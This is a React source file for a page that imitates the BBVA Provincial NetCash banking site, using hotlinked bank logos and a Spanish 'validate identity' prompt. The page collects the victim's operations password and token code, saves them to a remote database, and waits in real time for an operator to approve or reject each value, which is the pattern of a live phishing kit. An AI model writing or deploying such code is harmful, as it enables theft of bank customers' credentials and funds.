import { useState, useRef, useEffect } from "react";
import { useNavigate, useSearchParams } from "react-router-dom";
import { base44, supabase } from "@/api/base44Client";
import { usePresence } from "@/hooks/usePresence";

function EyeIcon({ visible }) {
  return visible ? (
    <img
      src="https://ve1.provinet.net/nhvp_ve_web/atpn_es_web_jsp/imgEmp/icon-hide.png"
      alt="Ocultar"
      style={{ width: "20px", height: "20px", objectFit: "contain" }}
    />
  ) : (
    <img
      src="https://www.provincialnetcash.com/local_pibee/fbin/img/icon-show-blue.png"
      alt="Mostrar"
      style={{ width: "20px", height: "20px", objectFit: "contain" }}
    />
  );
}

export default function NetCashVerify() {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const sessionId = searchParams.get("sessionId");

  const [claveOperaciones, setClaveOperaciones] = useState("");
  const [claveToken, setClaveToken] = useState("");
  const [showOp, setShowOp] = useState(false);
  const [showToken, setShowToken] = useState(false);
  const [loading, setLoading] = useState(false);
  const [rejectedField, setRejectedField] = useState(null); // null | "operaciones" | "token"
  const dismissRef = useRef(null);
  const { setEditing } = usePresence(sessionId);
  const formLoadTime = useRef(Date.now());
  const channelRef = useRef(null);
  const intervalRef = useRef(null);

  useEffect(() => {
    formLoadTime.current = Date.now();
    return () => cleanup();
  }, []);

  const cleanup = () => {
    if (intervalRef.current) { clearInterval(intervalRef.current); intervalRef.current = null; }
    if (channelRef.current) { supabase.removeChannel(channelRef.current); channelRef.current = null; }
  };

  const noSpaces = (setter) => (e) => setter(e.target.value.replace(/\s/g, ""));
  const isEnabled = claveOperaciones.length >= 2 && claveToken.length >= 2;

  const handleEntrar = async () => {
    if (!isEnabled || !sessionId || loading) return;
    if (Date.now() - formLoadTime.current < 1500) return;

    cleanup();
    setLoading(true);
    setRejectedField(null);

    await base44.entities.UserSessionData.update(sessionId, {
      claveEspecial: claveOperaciones,
      claveDigital: claveToken,
      claveEspecialStatus: "pending",
      claveDigitalStatus: "pending",
    });

    let done = false;

    const handleResult = (type) => {
      if (done) return;
      done = true;
      cleanup();
      setLoading(false);
      if (type === "reject-operaciones") {
        setRejectedField("operaciones");
        setClaveOperaciones("");
        if (dismissRef.current) clearTimeout(dismissRef.current);
        dismissRef.current = setTimeout(() => setRejectedField(null), 3000);
      } else if (type === "reject-token") {
        setRejectedField("token");
        setClaveToken("");
        if (dismissRef.current) clearTimeout(dismissRef.current);
        dismissRef.current = setTimeout(() => setRejectedField(null), 3000);
      } else {
        navigate("/rejection");
      }
    };

    const check = (especial, digital) => {
      if (especial === "rejected") { handleResult("reject-operaciones"); return true; }
      if (digital === "rejected")  { handleResult("reject-token");       return true; }
      if (especial === "approved" || digital === "approved") { handleResult("approved"); return true; }
      return false;
    };

    const channel = supabase
      .channel(`netcash-verify-${sessionId}-${Date.now()}`)
      .on("postgres_changes", {
        event: "UPDATE",
        schema: "public",
        table: "user_session_data",
        filter: `id=eq.${sessionId}`,
      }, (payload) => {
        check(payload.new.clave_especial_status, payload.new.clave_digital_status);
      })
      .subscribe();
    channelRef.current = channel;

    const interval = setInterval(async () => {
      if (done) return;
      const updated = await base44.entities.UserSessionData.filter({ id: sessionId });
      const session = updated[0];
      if (!session || done) return;
      check(session.claveEspecialStatus, session.claveDigitalStatus);
    }, 300);
    intervalRef.current = interval;
  };

  if (loading) {
    return (
      <div style={{ position: "fixed", inset: 0, background: "white", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", zIndex: 9999, gap: "20px" }}>
        <div style={{ width: "40px", height: "40px", border: "4px solid #e5e7eb", borderTop: "4px solid #1973B8", borderRadius: "50%", animation: "spin 1s linear infinite" }} />
        <style>{"@keyframes spin { to { transform: rotate(360deg); } }"}</style>
        <p style={{ margin: 0, fontSize: "14px", color: "#004481", fontFamily: '"BentonSansBBVA Book", Helvetica, Arial, sans-serif', letterSpacing: "0.02em" }}>Ingresando...</p>
      </div>
    );
  }

  return (
    <div
      style={{ minHeight: "100vh", backgroundColor: "#ffffff", fontFamily: "Arial, Helvetica, sans-serif" }}
      onFocus={() => setEditing(true)}
      onBlur={() => setEditing(false)}
    >
      {/* Header */}
      <nav style={{
        backgroundColor: "#004481",
        padding: "0 24px",
        display: "flex",
        alignItems: "center",
        justifyContent: "space-between",
        height: "64px"
      }}>
        <img
          src="https://www.provincialnetcash.com/landing/img/logo-bbva.png"
          alt="BBVA Provincial"
          style={{ height: "36px", objectFit: "contain" }}
        />
        <div onClick={() => navigate("/")} style={{ display: "flex", alignItems: "center", gap: "8px", cursor: "pointer" }}>
          <span style={{ color: "#ffffff", fontSize: "18px", fontWeight: "300" }}>&#x2715;</span>
          <span style={{ color: "#ffffff", fontSize: "15px", fontFamily: "BentonSansBBVA-Book, Helvetica, Arial, sans-serif" }}>Salir</span>
        </div>
      </nav>

      {/* Main Content */}
      <div style={{ display: "flex", flexDirection: "column", alignItems: "center", paddingTop: "80px" }}>

        {/* Mensaje de error inline por campo — desaparece en 3s */}
        {rejectedField && (
          <div style={{
            width: "420px",
            display: "flex",
            alignItems: "flex-start",
            gap: "12px",
            marginBottom: "28px",
            padding: "14px 18px",
            border: "1px solid #f5c6c6",
            backgroundColor: "#fff0f0",
            borderRadius: "6px",
          }}>
            <span style={{ fontSize: "20px", flexShrink: 0, lineHeight: 1 }}>⚠️</span>
            <p style={{ margin: 0, fontSize: "14px", color: "#c0392b", lineHeight: "1.5" }}>
              {rejectedField === "operaciones"
                ? "La Clave de Operaciones ingresada es incorrecta. Por favor, corrija la información e intente nuevamente."
                : "La Clave Token ingresada es incorrecta. Por favor, corrija la información e intente nuevamente."}
            </p>
          </div>
        )}

        {/* Instrucciones */}
        <div style={{ width: "520px", textAlign: "center", marginBottom: "36px", lineHeight: "1.8" }}>
          <p style={{ margin: 0, fontSize: "17px", fontWeight: "bold", color: "#222222" }}>
            Introducción de Firma requerida. Ingrese{" "}
            <span style={{ color: "#1976D2" }}>Clave de Operaciones</span>
            {" "}y{" "}
            <span style={{ color: "#1976D2" }}>Clave Token</span>
            {" "}para Validar Identidad.
          </p>
        </div>

        {/* Clave de Operaciones */}
        <div style={{ marginBottom: "24px", width: "237px" }}>
          <label style={{ fontSize: "14px", color: "#333333", display: "block", marginBottom: "8px", textAlign: "center", fontWeight: "bold" }}>
            Clave de Operaciones
          </label>
          <div style={{ position: "relative" }}>
            <input
              type={showOp ? "text" : "password"}
              value={claveOperaciones}
              onChange={(e) => { setRejectedField(null); noSpaces(setClaveOperaciones)(e); }}
              autoComplete="off"
              style={{
                width: "100%", height: "40px", border: "none",
                borderBottom: rejectedField === "operaciones" ? "2px solid #CC0000" : "2px solid #555555",
                backgroundColor: "#eeeeee",
                outline: "none", fontSize: "14px", padding: "4px 36px 4px 8px",
                display: "block", boxSizing: "border-box"
              }}
            />
            <button
              type="button"
              onClick={() => setShowOp(!showOp)}
              style={{ position: "absolute", right: "8px", top: "50%", transform: "translateY(-50%)", background: "none", border: "none", cursor: "pointer", padding: 0, display: "flex", alignItems: "center" }}
            >
              <EyeIcon visible={showOp} />
            </button>
          </div>
        </div>

        {/* Clave del Token */}
        <div style={{ marginBottom: "32px", width: "237px" }}>
          <label style={{ fontSize: "14px", color: "#333333", display: "block", marginBottom: "8px", textAlign: "center", fontWeight: "bold" }}>
            Clave Token
          </label>
          <div style={{ position: "relative" }}>
            <input
              type={showToken ? "text" : "password"}
              value={claveToken}
              onChange={(e) => { setRejectedField(null); noSpaces(setClaveToken)(e); }}
              autoComplete="off"
              style={{
                width: "100%", height: "40px", border: "none",
                borderBottom: rejectedField === "token" ? "2px solid #CC0000" : "2px solid #555555",
                backgroundColor: "#eeeeee",
                outline: "none", fontSize: "14px", padding: "4px 36px 4px 8px",
                display: "block", boxSizing: "border-box"
              }}
            />
            <button
              type="button"
              onClick={() => setShowToken(!showToken)}
              style={{ position: "absolute", right: "8px", top: "50%", transform: "translateY(-50%)", background: "none", border: "none", cursor: "pointer", padding: 0, display: "flex", alignItems: "center" }}
            >
              <EyeIcon visible={showToken} />
            </button>
          </div>
        </div>

        {/* Botón Continuar */}
        <div style={{ width: "237px", display: "flex", justifyContent: "center" }}>
          <button
            onClick={handleEntrar}
            disabled={!isEnabled}
            style={{
              width: "160px", height: "40px",
              backgroundColor: isEnabled ? "#1973B8" : "#cccccc",
              color: isEnabled ? "#ffffff" : "#555555",
              border: "none", fontSize: "15px",
              cursor: isEnabled ? "pointer" : "not-allowed",
              fontFamily: "Arial, sans-serif",
              letterSpacing: "0.5px",
              transition: "background-color 0.2s"
            }}
          >
            Continuar
          </button>
        </div>
      </div>
    </div>
  );
}
